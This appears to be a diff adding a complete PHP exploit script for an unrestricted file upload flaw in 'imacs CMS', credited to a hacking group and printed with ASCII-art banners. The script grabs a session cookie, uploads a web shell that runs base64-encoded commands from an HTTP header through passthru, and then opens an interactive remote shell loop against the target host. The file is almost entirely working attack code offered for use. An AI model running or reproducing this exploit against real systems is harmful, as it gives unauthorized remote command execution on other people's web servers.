@@ -1,0 +1,82 @@
+&lt;?php
+error_reporting(0);
+set_time_limit(0);
+ini_set(&quot;default_socket_timeout&quot;, 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die(&quot;\n[-] No response from {$host}:80\n&quot;);
+  
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+ 
+print &quot;\n==============================================\n&quot;;
+print &quot;  imacs CMS Unrestricted File Upload Exploit  \n&quot;;
+print &quot;                                              \n&quot;;
+print &quot;        Discovered By CWH Underground         \n&quot;;
+print &quot;==============================================\n\n&quot;;
+print &quot;  ,--^----------,--------,-----,-------^--,   \n&quot;;
+print &quot;  | |||||||||   `--------&#039;     |          O   \n&quot;;
+print &quot;  `+---------------------------^----------|   \n&quot;;
+print &quot;    `\_,-------, _________________________|   \n&quot;;
+print &quot;      / XXXXXX /`|     /                      \n&quot;;
+print &quot;     / XXXXXX /  `\   /                       \n&quot;;
+print &quot;    / XXXXXX /\______(                        \n&quot;;
+print &quot;   / XXXXXX /                                 \n&quot;;
+print &quot;  / XXXXXX /   .. CWH Underground Hacking Team ..  \n&quot;;
+print &quot; (________(                                   \n&quot;;
+print &quot;  `------&#039;                                    \n\n&quot;;
+
+  
+if ($argc &lt; 3)
+{
+    print &quot;\nUsage......: php $argv[0] &lt;host&gt; &lt;path&gt;\n&quot;;
+    print &quot;\nExample....: php $argv[0] localhost /&quot;;
+    print &quot;\nExample....: php $argv[0] localhost /imacs/\n&quot;;
+    die();
+}
+ 
+$host = $argv[1];
+$path = $argv[2];
+ 
+
+$payload  = &quot;--o0oOo0o\r\n&quot;;
+$payload .= &quot;Content-Disposition: form-data; name=\&quot;upload\&quot;; filename=\&quot;sh.php\&quot;\r\n&quot;;
+$payload .= &quot;Content-Type: application/octet-stream\r\n\r\n&quot;;
+$payload .= &quot;&lt;?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n&quot;;
+$payload .= &quot;--o0oOo0o--\r\n&quot;;
+
+$packet  = &quot;GET {$path} HTTP/1.0\r\n&quot;;
+$packet .= &quot;Host: {$host}\r\n&quot;;
+$packet .= &quot;Connection: close\r\n\r\n{$payload}&quot;;
+
+$response = http_send($host, $packet);
+
+if (!preg_match(&quot;/Set-Cookie: ([^;]*);/i&quot;, $response, $sid)) die(&quot;\n[-] Session ID not found!\n&quot;);
+
+$packet  = &quot;POST {$path}src/assets/mng/mng.php?dir= HTTP/1.0\r\n&quot;;
+$packet .= &quot;Host: {$host}\r\n&quot;;
+$packet .= &quot;Cookie: {$sid[1]}\r\n&quot;;
+$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
+$packet .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
+$packet .= &quot;Connection: close\r\n\r\n{$payload}&quot;;
+     
+http_send($host, $packet);
+ 
+$packet  = &quot;GET {$path}content/uploads/sh.php HTTP/1.0\r\n&quot;;
+$packet .= &quot;Host: {$host}\r\n&quot;;
+$packet .= &quot;Cmd: %s\r\n&quot;;
+$packet .= &quot;Connection: close\r\n\r\n&quot;;
+     
+while(1)
+{
+    print &quot;\nimacs-shell# &quot;;
+    if (($cmd = trim(fgets(STDIN))) == &quot;exit&quot;) break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match(&#039;/___(.*)/s&#039;, $response, $m) ? print $m[1] : die(&quot;\n[-] Exploit failed!\n&quot;);
+}
+
+
+?&gt;
